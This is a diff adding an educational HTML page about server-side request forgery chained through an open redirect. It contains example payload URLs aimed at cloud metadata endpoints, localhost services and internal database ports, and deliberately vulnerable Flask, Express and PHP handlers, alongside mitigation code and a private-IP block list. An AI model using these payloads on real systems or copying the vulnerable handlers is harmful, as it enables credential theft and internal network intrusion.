@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF with Redirect Attack Flow</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            color: #e4e4e4;
+            padding: 40px 20px;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            padding: 40px 0;
+            margin-bottom: 40px;
+            border-bottom: 3px solid #ff6b6b;
+        }
+
+        h1 {
+            color: #ff6b6b;
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #ffd93d;
+            font-size: 1.2rem;
+        }
+
+        /* Horizontal Flow */
+        .horizontal-flow {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            padding: 30px;
+            border: 2px solid rgba(255, 107, 107, 0.3);
+            margin-bottom: 40px;
+            overflow-x: auto;
+        }
+
+        .flow-row {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            min-width: max-content;
+            padding: 20px 0;
+        }
+
+        .flow-item {
+            background: linear-gradient(135deg, rgba(255, 107, 107, 0.15), rgba(233, 69, 96, 0.15));
+            border: 2px solid #ff6b6b;
+            border-radius: 15px;
+            padding: 20px;
+            min-width: 220px;
+            text-align: center;
+            flex-shrink: 0;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .flow-item:hover {
+            background: linear-gradient(135deg, rgba(255, 107, 107, 0.25), rgba(233, 69, 96, 0.25));
+            transform: scaleY(1.05);
+            box-shadow: 0 0 30px rgba(255, 107, 107, 0.4);
+        }
+
+        .flow-item.attacker {
+            border-color: #e94560;
+            background: linear-gradient(135deg, rgba(233, 69, 96, 0.2), rgba(255, 107, 107, 0.2));
+        }
+
+        .flow-item.user {
+            border-color: #00d9ff;
+            background: linear-gradient(135deg, rgba(0, 217, 255, 0.15), rgba(0, 153, 204, 0.15));
+        }
+
+        .flow-item.vulnerable {
+            border-color: #ffd93d;
+            background: linear-gradient(135deg, rgba(255, 217, 61, 0.15), rgba(255, 179, 0, 0.15));
+        }
+
+        .flow-item.danger {
+            border-color: #ff4757;
+            background: linear-gradient(135deg, rgba(255, 71, 87, 0.2), rgba(255, 107, 107, 0.2));
+        }
+
+        .flow-number {
+            background: #ff6b6b;
+            color: #fff;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin: 0 auto 10px;
+            font-size: 1.2rem;
+        }
+
+        .flow-title {
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        .flow-desc {
+            font-size: 0.85rem;
+            color: #ccc;
+            line-height: 1.4;
+        }
+
+        .flow-detail {
+            font-family: 'Courier New', monospace;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 8px;
+            border-radius: 6px;
+            margin-top: 8px;
+            font-size: 0.75rem;
+            color: #a5d6ff;
+            word-break: break-word;
+        }
+
+        .arrow {
+            font-size: 1.8rem;
+            color: #ff6b6b;
+            flex-shrink: 0;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        /* Sections */
+        .section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        h2 {
+            color: #ff6b6b;
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+        }
+
+        h3 {
+            color: #ffd93d;
+            margin: 20px 0 15px 0;
+            font-size: 1.2rem;
+        }
+
+        .code-box {
+            background: #0d1117;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+            overflow-x: auto;
+            border-left: 4px solid #ff6b6b;
+        }
+
+        .code-box pre {
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            color: #a5d6ff;
+        }
+
+        .comparison-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 768px) {
+            .comparison-grid {
+                grid-template-columns: 1fr;
+            }
+            .flow-row {
+                flex-wrap: wrap;
+            }
+            .arrow {
+                width: 100%;
+                text-align: center;
+            }
+        }
+
+        .box {
+            border-radius: 10px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .box.vulnerable {
+            border: 2px solid #ff6b6b;
+        }
+
+        .box.secure {
+            border: 2px solid #00ff88;
+        }
+
+        .box h4 {
+            margin-bottom: 15px;
+        }
+
+        .vulnerable h4 {
+            color: #ff6b6b;
+        }
+
+        .secure h4 {
+            color: #00ff88;
+        }
+
+        .attack-scenario {
+            background: rgba(255, 107, 107, 0.1);
+            border-left: 4px solid #ff6b6b;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+
+        .attack-scenario h4 {
+            color: #ff6b6b;
+            margin-bottom: 10px;
+        }
+
+        .step-by-step {
+            list-style: none;
+            margin: 15px 0;
+        }
+
+        .step-by-step li {
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-left: 30px;
+            position: relative;
+        }
+
+        .step-by-step li:last-child {
+            border-bottom: none;
+        }
+
+        .step-by-step li::before {
+            content: '→';
+            position: absolute;
+            left: 0;
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+
+        .impact-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .impact-card {
+            background: rgba(255, 107, 107, 0.1);
+            border: 2px solid #ff6b6b;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .impact-card h4 {
+            color: #ff6b6b;
+            margin-bottom: 10px;
+        }
+
+        .highlight {
+            background: rgba(255, 217, 61, 0.2);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #ffd93d;
+        }
+
+        .diagram-explanation {
+            background: rgba(255, 107, 107, 0.08);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 4px solid #ff6b6b;
+        }
+
+        .key-point {
+            background: rgba(0, 217, 255, 0.1);
+            border-left: 4px solid #00d9ff;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+        }
+
+        .key-point strong {
+            color: #00d9ff;
+        }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            color: #666;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔴 SSRF with Redirect Attack Flow</h1>
+            <p class="subtitle">Server-Side Request Forgery via Open Redirect</p>
+        </header>
+
+        <!-- Main Horizontal Flow -->
+        <div class="horizontal-flow">
+            <h2 style="margin-bottom: 30px; text-align: center;">Attack Sequence (Horizontal Flow)</h2>
+            
+            <div class="flow-row">
+                <!-- Step 1 -->
+                <div class="flow-item attacker">
+                    <div class="flow-number">1</div>
+                    <div class="flow-title">Attacker Identifies</div>
+                    <div class="flow-desc">
+                        Finds a vulnerable site with:
+                        <br/>• Open redirect endpoint
+                        <br/>• SSRF-capable function
+                    </div>
+                    <div class="flow-detail">
+                        /redirect?url=http://internal
+                    </div>
+                </div>
+
+                <div class="arrow">→</div>
+
+                <!-- Step 2 -->
+                <div class="flow-item attacker">
+                    <div class="flow-number">2</div>
+                    <div class="flow-title">Crafts Malicious URL</div>
+                    <div class="flow-desc">
+                        Chains SSRF function with redirect
+                    </div>
+                    <div class="flow-detail">
+                        /fetch?url=/redirect?url=169.254.169.254
+                    </div>
+                </div>
+
+                <div class="arrow">→</div>
+
+                <!-- Step 3 -->
+                <div class="flow-item">
+                    <div class="flow-number">3</div>
+                    <div class="flow-title">User Clicks</div>
+                    <div class="flow-desc">
+                        Victim clicks attacker's link
+                    </div>
+                    <div class="flow-detail">
+                        Unaware of the chain
+                    </div>
+                </div>
+
+                <div class="arrow">→</div>
+
+                <!-- Step 4 -->
+                <div class="flow-item vulnerable">
+                    <div class="flow-number">4</div>
+                    <div class="flow-title">Server Makes Request</div>
+                    <div class="flow-desc">
+                        fetch() function triggered
+                    </div>
+                    <div class="flow-detail">
+                        Makes HTTP request to /redirect
+                    </div>
+                </div>
+
+                <div class="arrow">→</div>
+
+                <!-- Step 5 -->
+                <div class="flow-item vulnerable">
+                    <div class="flow-number">5</div>
+                    <div class="flow-title">Redirect Happens</div>
+                    <div class="flow-desc">
+                        Server follows redirect
+                    </div>
+                    <div class="flow-detail">
+                        302 Location: 169.254.169.254
+                    </div>
+                </div>
+
+                <div class="arrow">→</div>
+
+                <!-- Step 6 -->
+                <div class="flow-item danger">
+                    <div class="flow-number">6</div>
+                    <div class="flow-title">Accesses Internal Resource</div>
+                    <div class="flow-desc">
+                        Server reaches restricted network
+                    </div>
+                    <div class="flow-detail">
+                        AWS metadata, internal APIs
+                    </div>
+                </div>
+
+                <div class="arrow">→</div>
+
+                <!-- Step 7 -->
+                <div class="flow-item danger">
+                    <div class="flow-number">7</div>
+                    <div class="flow-title">Attacker Gets Data</div>
+                    <div class="flow-desc">
+                        Sensitive info exposed
+                    </div>
+                    <div class="flow-detail">
+                        AWS keys, DB credentials, etc.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Detailed Explanation -->
+        <div class="section">
+            <h2>📊 Why This Attack Works</h2>
+
+            <div class="diagram-explanation">
+                <h3>The Core Vulnerability Chain</h3>
+                <ol style="margin-left: 20px; line-height: 2; margin-top: 15px;">
+                    <li><span class="highlight">Vulnerable SSRF function</span>: Server-side code makes HTTP requests on behalf of users</li>
+                    <li><span class="highlight">Open Redirect endpoint</span>: A parameter that redirects users without validation</li>
+                    <li><span class="highlight">No redirect validation</span>: The SSRF function follows redirects automatically</li>
+                    <li><span class="highlight">No internal network filtering</span>: Server can reach private IP ranges</li>
+                    <li><span class="highlight">Result</span>: Attacker can access internal resources through the chain</li>
+                </ol>
+            </div>
+
+            <h3>The Two-Step Process</h3>
+            <div class="comparison-grid">
+                <div class="box vulnerable">
+                    <h4>Without Redirect (Basic SSRF)</h4>
+                    <div class="code-box">
+                        <pre><span style="color: #ff6b6b;">// Direct access attempt - BLOCKED</span>
+http://victim.com/fetch?url=http://169.254.169.254
+
+<span style="color: #999;">// Server rejects private IPs</span>
+if (url.startsWith("http://169") ||
+    url.startsWith("http://10") ||
+    url.startsWith("http://192.168")) {
+  reject();
+}</pre>
+                    </div>
+                </div>
+
+                <div class="box danger">
+                    <h4>With Redirect (Bypass!)</h4>
+                    <div class="code-box">
+                        <pre><span style="color: #ff6b6b;">// Chains with redirect - WORKS!</span>
+http://victim.com/fetch?url=
+  /redirect?url=169.254.169.254
+
+<span style="color: #999;">// Server sees /redirect (public) as safe</span>
+// Then follows 302 Location header
+// To the restricted IP (too late!)</span></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step-by-Step Technical Flow -->
+        <div class="section">
+            <h2>🔍 Technical Breakdown</h2>
+
+            <h3>What Happens Behind the Scenes:</h3>
+            <ol class="step-by-step">
+                <li>
+                    <strong>User Request</strong>
+                    <div class="code-box" style="margin: 10px 0; border-left-color: #00d9ff;">
+                        <pre>GET /fetch?url=/redirect?url=169.254.169.254/latest/meta-data/</pre>
+                    </div>
+                </li>
+                <li>
+                    <strong>Server validates initial URL</strong>
+                    <div class="code-box" style="margin: 10px 0; border-left-color: #ffd93d;">
+                        <pre>URL = "/redirect?url=..."
+// Passes validation (not a private IP!)</pre>
+                    </div>
+                </li>
+                <li>
+                    <strong>Server makes HTTP request</strong>
+                    <div class="code-box" style="margin: 10px 0; border-left-color: #00d9ff;">
+                        <pre>curl /redirect?url=169.254.169.254
+// Receives 302 redirect response</pre>
+                    </div>
+                </li>
+                <li>
+                    <strong>Server follows redirect</strong>
+                    <div class="code-box" style="margin: 10px 0; border-left-color: #ff6b6b;">
+                        <pre>HTTP/1.1 302 Found
+Location: http://169.254.169.254/latest/meta-data/
+
+// Server automatically follows (default behavior!)</pre>
+                    </div>
+                </li>
+                <li>
+                    <strong>Server reaches internal resource</strong>
+                    <div class="code-box" style="margin: 10px 0; border-left-color: #ff4757;">
+                        <pre>curl http://169.254.169.254/latest/meta-data/
+// SUCCESS! AWS credentials returned</pre>
+                    </div>
+                </li>
+                <li>
+                    <strong>Attacker gets the data</strong>
+                    <div class="code-box" style="margin: 10px 0; border-left-color: #ff4757;">
+                        <pre>Response body includes:
+- AWS_ACCESS_KEY_ID
+- AWS_SECRET_ACCESS_KEY
+- AWS credentials...</pre>
+                    </div>
+                </li>
+            </ol>
+        </div>
+
+        <!-- Real-World Examples -->
+        <div class="section">
+            <h2>🎯 Attack Scenarios & Examples</h2>
+
+            <div class="attack-scenario">
+                <h4>Scenario 1: AWS Metadata Theft</h4>
+                <p style="margin-bottom: 10px;">
+                    Attack URL:
+                </p>
+                <div class="code-box" style="border-left-color: #ff6b6b;">
+                    <pre>http://victim.com/fetch?url=/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role</pre>
+                </div>
+                <p style="margin-top: 15px; color: #ff6b6b;"><strong>Impact:</strong> Attacker steals AWS temporary credentials with full EC2 access</p>
+            </div>
+
+            <div class="attack-scenario">
+                <h4>Scenario 2: Internal Database Access</h4>
+                <p style="margin-bottom: 10px;">
+                    Attack URL:
+                </p>
+                <div class="code-box" style="border-left-color: #ff6b6b;">
+                    <pre>http://victim.com/fetch?url=/redirect?url=http://192.168.1.50:5432
+http://victim.com/fetch?url=/redirect?url=http://10.0.0.100:3306</pre>
+                </div>
+                <p style="margin-top: 15px; color: #ff6b6b;"><strong>Impact:</strong> Attacker port-scans internal network, finds and accesses databases</p>
+            </div>
+
+            <div class="attack-scenario">
+                <h4>Scenario 3: Internal Service Exploitation</h4>
+                <p style="margin-bottom: 10px;">
+                    Attack URL:
+                </p>
+                <div class="code-box" style="border-left-color: #ff6b6b;">
+                    <pre>http://victim.com/fetch?url=/redirect?url=http://localhost:8080/admin
+http://victim.com/fetch?url=/redirect?url=http://127.0.0.1:9200</pre>
+                </div>
+                <p style="margin-top: 15px; color: #ff6b6b;"><strong>Impact:</strong> Attacker accesses unprotected internal services (Elasticsearch, admin panels)</p>
+            </div>
+
+            <div class="attack-scenario">
+                <h4>Scenario 4: Cloud Config Server Attack</h4>
+                <p style="margin-bottom: 10px;">
+                    Attack URL:
+                </p>
+                <div class="code-box" style="border-left-color: #ff6b6b;">
+                    <pre>http://victim.com/fetch?url=/redirect?url=http://169.254.169.254/latest/user-data/
+http://victim.com/fetch?url=/redirect?url=http://metadata.google.internal/computeMetadata/</pre>
+                </div>
+                <p style="margin-top: 15px; color: #ff6b6b;"><strong>Impact:</strong> Attacker retrieves cloud instance configuration, secrets, and environment variables</p>
+            </div>
+        </div>
+
+        <!-- Impact Analysis -->
+        <div class="section">
+            <h2>⚠️ Attack Impact</h2>
+
+            <div class="impact-grid">
+                <div class="impact-card">
+                    <h4>🔐 Credential Theft</h4>
+                    <p>AWS keys, API tokens, database passwords, SSH keys</p>
+                </div>
+                <div class="impact-card">
+                    <h4>💾 Data Breach</h4>
+                    <p>Access to internal databases, file systems, configuration files</p>
+                </div>
+                <div class="impact-card">
+                    <h4>🔗 Network Mapping</h4>
+                    <p>Discovery of internal IP ranges, services, and ports</p>
+                </div>
+                <div class="impact-card">
+                    <h4>🚀 Lateral Movement</h4>
+                    <p>Use stolen credentials to access other internal systems</p>
+                </div>
+                <div class="impact-card">
+                    <h4>🎯 Service Disruption</h4>
+                    <p>Attack internal services, cause DoS, modify configurations</p>
+                </div>
+                <div class="impact-card">
+                    <h4>🌐 Infrastructure Compromise</h4>
+                    <p>Gain control of cloud instances, containers, orchestration</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Vulnerable Code Examples -->
+        <div class="section">
+            <h2>💻 Vulnerable Code Examples</h2>
+
+            <h3>Python (Flask) - Vulnerable</h3>
+            <div class="code-box">
+                <pre><span style="color: #ff6b6b;">@app.route('/fetch')</span>
+<span style="color: #ff6b6b;">def fetch_url():</span>
+    url = request.args.get('url')
+    
+    <span style="color: #ff6b6b;">// NO VALIDATION!</span>
+    <span style="color: #ff6b6b;">// Follows redirects by default</span>
+    response = requests.get(url, allow_redirects=<span style="color: #ff6b6b;">True</span>)
+    
+    return response.text
+
+<span style="color: #ff6b6b;">@app.route('/redirect')</span>
+<span style="color: #ff6b6b;">def redirect_endpoint():</span>
+    url = request.args.get('url')
+    return redirect(url)  <span style="color: #ff6b6b;">// Open redirect!</span></pre>
+            </div>
+
+            <h3>Node.js (Express) - Vulnerable</h3>
+            <div class="code-box">
+                <pre><span style="color: #ff6b6b;">app.get('/fetch', async (req, res) => {</span>
+    const url = req.query.url;
+    
+    <span style="color: #ff6b6b;">// NO VALIDATION!</span>
+    <span style="color: #ff6b6b;">// Default fetch follows redirects</span>
+    const response = <span style="color: #ff6b6b;">await fetch(url)</span>;
+    const data = await response.text();
+    
+    res.send(data);
+})
+
+<span style="color: #ff6b6b;">app.get('/redirect', (req, res) => {</span>
+    const url = req.query.url;
+    res.redirect(url);  <span style="color: #ff6b6b;">// Open redirect!</span>
+})</pre>
+            </div>
+
+            <h3>PHP - Vulnerable</h3>
+            <div class="code-box">
+                <pre><span style="color: #ff6b6b;">&lt;?php</span>
+<span style="color: #ff6b6b;">if ($_GET['action'] == 'fetch') {</span>
+    $url = $_GET['url'];
+    
+    <span style="color: #ff6b6b;">// NO VALIDATION!</span>
+    <span style="color: #ff6b6b;">// cURL follows redirects by default</span>
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span style="color: #ff6b6b;">true</span>);
+    curl_exec($ch);
+}
+
+<span style="color: #ff6b6b;">if ($_GET['action'] == 'redirect') {</span>
+    $url = $_GET['url'];
+    header("Location: $url");  <span style="color: #ff6b6b;">// Open redirect!</span>
+}
+<span style="color: #ff6b6b;">?&gt;</span></pre>
+            </div>
+        </div>
+
+        <!-- Defense Mechanisms -->
+        <div class="section">
+            <h2>🛡️ Prevention & Mitigation</h2>
+
+            <h3>1. Disable Automatic Redirects</h3>
+            <div class="code-box">
+                <pre><span style="color: #00ff88;">// Python - Disable redirect following</span>
+session = requests.Session()
+session.max_redirects = 0
+response = session.get(url)
+
+<span style="color: #00ff88;">// Node.js - Disable redirects</span>
+const response = await fetch(url, { redirect: 'manual' });
+
+<span style="color: #00ff88;">// PHP - Disable redirect following</span>
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);</pre>
+            </div>
+
+            <h3>2. Whitelist Allowed Domains</h3>
+            <div class="code-box">
+                <pre><span style="color: #00ff88;">// Whitelist approach</span>
+const ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com'];
+
+function isAllowedURL(urlString) {
+    try {
+        const url = new URL(urlString);
+        return ALLOWED_HOSTS.includes(url.hostname);
+    } catch {
+        return false;
+    }
+}
+
+if (!isAllowedURL(userUrl)) {
+    throw new Error('URL not in whitelist');
+}</pre>
+            </div>
+
+            <h3>3. Block Private IP Ranges</h3>
+            <div class="code-box">
+                <pre><span style="color: #00ff88;">// Block private IPs comprehensively</span>
+const BLOCKED_RANGES = [
+    '127.0.0.0/8',      // Localhost
+    '169.254.0.0/16',   // AWS metadata
+    '192.168.0.0/16',   // Private network
+    '10.0.0.0/8',       // Private network
+    '172.16.0.0/12',    // Private network
+    '::1/128',          // IPv6 localhost
+    'fc00::/7',         // IPv6 private
+];
+
+function isBlockedIP(host) {
+    const ip = dnsSync.resolve4(host)[0];
+    return BLOCKED_RANGES.some(range => ipInRange(ip, range));
+}</pre>
+            </div>
+
+            <h3>4. Fix Open Redirect</h3>
+            <div class="code-box">
+                <pre><span style="color: #00ff88;">// Secure redirect - whitelist only</span>
+app.get('/redirect', (req, res) => {
+    const url = req.query.url;
+    const ALLOWED = ['example.com', 'trusted.com'];
+    
+    const urlObj = new URL(url);
+    if (!ALLOWED.includes(urlObj.hostname)) {
+        return res.status(400).send('Invalid redirect');
+    }
+    
+    res.redirect(url);
+});</pre>
+            </div>
+
+            <h3>5. Use URL Parser & Validation</h3>
+            <div class="code-box">
+                <pre><span style="color: #00ff88;">// Validate and sanitize URLs</span>
+function validateURL(urlString) {
+    try {
+        const url = new URL(urlString);
+        
+        // Only allow HTTP/HTTPS
+        if (!['http:', 'https:'].includes(url.protocol)) {
+            throw new Error('Invalid protocol');
+        }
+        
+        // Block private IP ranges
+        if (isPrivateIP(url.hostname)) {
+            throw new Error('Private IP blocked');
+        }
+        
+        // Whitelist domains
+        if (!isWhitelisted(url.hostname)) {
+            throw new Error('Domain not allowed');
+        }
+        
+        return url;
+    } catch (e) {
+        throw new Error(`Invalid URL: ${e.message}`);
+    }
+}</pre>
+            </div>
+        </div>
+
+        <!-- Key Differences Table -->
+        <div class="section">
+            <h2>📋 SSRF Attack Variants</h2>
+
+            <table style="width: 100%; border-collapse: collapse; margin-top: 15px;">
+                <tr style="background: rgba(255, 107, 107, 0.1);">
+                    <th style="padding: 15px; text-align: left; border-bottom: 2px solid #ff6b6b;">Attack Type</th>
+                    <th style="padding: 15px; text-align: left; border-bottom: 2px solid #ff6b6b;">Method</th>
+                    <th style="padding: 15px; text-align: left; border-bottom: 2px solid #ff6b6b;">Target</th>
+                </tr>
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
+                    <td style="padding: 15px;"><strong>Direct SSRF</strong></td>
+                    <td style="padding: 15px;">Direct IP in fetch parameter</td>
+                    <td style="padding: 15px;">Internal services</td>
+                </tr>
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
+                    <td style="padding: 15px;"><strong>SSRF + Redirect</strong></td>
+                    <td style="padding: 15px;">Chain with open redirect (THIS ONE)</td>
+                    <td style="padding: 15px;">Bypasses IP filtering</td>
+                </tr>
+                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
+                    <td style="padding: 15px;"><strong>Time-Based SSRF</strong></td>
+                    <td style="padding: 15px;">Measure response time to infer data</td>
+                    <td style="padding: 15px;">Blind SSRF scenarios</td>
+                </tr>
+                <tr>
+                    <td style="padding: 15px;"><strong>DNS Rebinding</strong></td>
+                    <td style="padding: 15px;">DNS returns different IP on second lookup</td>
+                    <td style="padding: 15px;">Bypass DNS-based checks</td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>⭐ Key Takeaways</h2>
+
+            <div class="key-point">
+                <strong>Why Redirect + SSRF is Dangerous:</strong>
+                <p style="margin-top: 10px;">
+                    The redirect acts as a "trusted intermediary." The server validates the initial URL (the redirect endpoint, which is legitimate) but then blindly follows the Location header to wherever the attacker wants. This bypasses IP-based filtering.
+                </p>
+            </div>
+
+            <div class="key-point">
+                <strong>The Two Critical Flaws:</strong>
+                <p style="margin-top: 10px;">
+                    1) <strong>Open Redirect:</strong> The /redirect endpoint accepts any URL without validation<br/>
+                    2) <strong>Automatic Redirect Following:</strong> The SSRF function (fetch/curl/requests) follows redirects by default
+                </p>
+            </div>
+
+            <div class="key-point">
+                <strong>Why This Bypasses Protections:</strong>
+                <p style="margin-top: 10px;">
+                    • IP filtering only checks the INITIAL URL (/redirect = public)<br/>
+                    • Attacker's actual target is in the Location header (checked too late)<br/>
+                    • By the time the server follows the redirect, validation has already passed
+                </p>
+            </div>
+
+            <div class="key-point">
+                <strong>Real-World Impact:</strong>
+                <p style="margin-top: 10px;">
+                    Access to AWS metadata (169.254.169.254), GCP/Azure cloud metadata, internal databases, admin panels, and other services that assume "you must be internal to access me." The attacker uses the vulnerable server as a proxy to reach these resources.
+                </p>
+            </div>
+        </div>
+
+        <footer>
+            <p>🎓 SSRF with Redirect Attack Flow | Educational Purpose Only</p>
+            <p style="margin-top: 10px;">Always practice ethical hacking and get proper authorization before testing!</p>
+        </footer>
+    </div>
+</body>
+</html>
